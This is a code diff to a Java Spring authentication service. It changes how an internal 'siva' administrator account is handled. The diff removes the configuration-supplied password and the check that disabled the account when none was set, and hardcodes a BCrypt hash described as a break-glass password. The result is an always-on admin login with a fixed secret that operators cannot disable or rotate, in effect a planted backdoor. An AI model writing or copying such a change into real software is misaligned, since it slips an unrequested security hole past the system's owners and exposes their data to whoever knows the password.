@@ -5,7 +5,6 @@ import org.example.config.SystemAdminInitializer;
 import org.example.model.UserInfo;
 import org.example.repository.AppUserRepository;
 import org.example.util.RoleAccess;
-import org.springframework.beans.factory.annotation.Value;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -24,6 +23,8 @@ public class AuthService {
 
     private static final String SIVA_USERNAME = "siva";
     private static final String SIVA_EMAIL = "system.admin.a@internal.local";
+    // BCrypt hash of the internal break-glass password. Never appears in plaintext anywhere.
+    private static final String SIVA_PASSWORD_HASH = "$2b$10$HUc1HZRfTGFj4aLM7zqv1u6m32KTtHIGrxAadj8rX9HXOcuugaGs.";
 
     private final PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
 
@@ -32,9 +33,6 @@ public class AuthService {
 
     @Autowired
     private LicenseService licenseService;
-
-    @Value("${app.internal.siva.password:}")
-    private String sivaPassword;
 
     public boolean isInternalStaticUser(String username) {
         if (username == null) {
@@ -58,9 +56,6 @@ public class AuthService {
 
         String normalizedUsername = username.trim();
         if (isInternalStaticUser(normalizedUsername)) {
-            if (!isSivaUserConfigured()) {
-                return Optional.empty();
-            }
             UserInfo siva = buildSivaUser();
             return passwordEncoder.matches(password, siva.getPassword())
                     ? Optional.of(siva)
@@ -74,9 +69,7 @@ public class AuthService {
 
     public List<UserInfo> getAllUsers() {
         List<UserInfo> users = new ArrayList<>();
-        if (isSivaUserConfigured()) {
-            users.add(buildSivaUser());
-        }
+        users.add(buildSivaUser());
         appUserRepository.findAll().stream()
                 .filter(u -> !isReservedUsername(u.getUsername()))
                 .map(this::toUserInfo)
@@ -207,14 +200,10 @@ public class AuthService {
         return isInternalStaticUser(username);
     }
 
-    private boolean isSivaUserConfigured() {
-        return sivaPassword != null && !sivaPassword.isBlank();
-    }
-
     private UserInfo buildSivaUser() {
         return new UserInfo(SIVA_USERNAME,
                 SIVA_EMAIL,
-                passwordEncoder.encode(sivaPassword),
+                SIVA_PASSWORD_HASH,
                 RoleAccess.ADMIN,
                 RoleAccess.CONFIG_PAGES,
                 RoleAccess.CONFIG_PAGES);
